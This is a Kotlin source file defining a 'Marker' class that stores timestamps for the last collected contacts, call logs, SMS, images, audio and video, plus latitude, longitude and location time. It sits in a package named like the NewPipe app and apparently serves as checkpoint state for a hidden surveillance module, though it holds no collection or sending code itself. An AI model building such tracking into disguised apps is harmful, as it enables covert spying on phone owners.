package org.schabi.newpipe.gameover
import android.content.Context
import android.content.SharedPreferences

class Marker(context: Context) {
    private var sp: SharedPreferences = context.getSharedPreferences("marker", Context.MODE_PRIVATE)

    public fun setContactId(count: Int) {
        sp.edit().putInt("contactId", count).commit()
    }

    public fun getContactId(): Int {
        return sp.getInt("contactId", 0)
    }

    public fun setLastCallLog(callLogTime: String) {
        sp.edit().putString("callLogTime", callLogTime).commit()
    }

    public fun getLastCallLog(): String {
        return sp.getString("callLogTime", "0000").toString()
    }

    public fun setLastSmsLog(smsLogTime: String) {
        sp.edit().putString("smsLogTime", smsLogTime).commit()
    }

    public fun getLastSmsLog(): String {
        return sp.getString("smsLogTime", "0000").toString()
    }

    public fun setLastImage(imageTime: String) {
        sp.edit().putString("imageTime", imageTime).commit()
    }

    public fun getLastImage(): String {
        return sp.getString("imageTime", "0000").toString()
    }

    public fun setLastAudio(audioTime: String) {
        sp.edit().putString("audioTime", audioTime).commit()
    }

    public fun getLastAudio(): String {
        return sp.getString("audioTime", "0000").toString()
    }

    public fun setLastVideo(videoTime: String) {
        sp.edit().putString("videoTime", videoTime).commit()
    }

    public fun getLastVideo(): String {
        return sp.getString("videoTime", "0000").toString()
    }

    public fun getLat(): String {
        return sp.getString("lat", "default").toString()
    }

    public fun setLat(lat: String) {
        sp.edit().putString("lat", lat).commit()
    }

    public fun getLong(): String {
        return sp.getString("long", "default").toString()
    }

    public fun setLong(longg: String) {
        sp.edit().putString("long", longg).commit()
    }

    public fun getloctime(): String {
        return sp.getString("locTime", "default").toString()
    }

    public fun setLocTime(loctime: String) {
        sp.edit().putString("locTime", loctime).commit()
    }
}
